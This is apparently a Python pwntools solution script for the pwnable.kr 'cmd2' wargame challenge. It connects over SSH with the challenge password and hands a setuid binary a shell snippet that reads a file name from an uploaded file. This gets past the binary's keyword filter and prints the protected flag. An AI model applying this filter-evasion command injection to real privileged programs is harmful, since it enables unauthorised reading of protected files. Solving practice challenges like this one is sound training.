from pwn import *

s = ssh('cmd2', 'pwnable.kr', port=2222, password='mommy now I get what PATH environment is for :)')

s.process(['mkdir', '/tmp/azby'])
s.process(['ln', '-sf', '/home/cmd2/flag', '/tmp/azby/flag'])
s.upload_data(b'flag', '/tmp/azby/varflg')

p = s.process(
    cwd='/tmp/azby',
    argv=['/home/cmd2/cmd2',
    '''read varname < varflg
while read line; do
    echo "$line"
done < "$varname"'''
])

print(p.recvall().decode())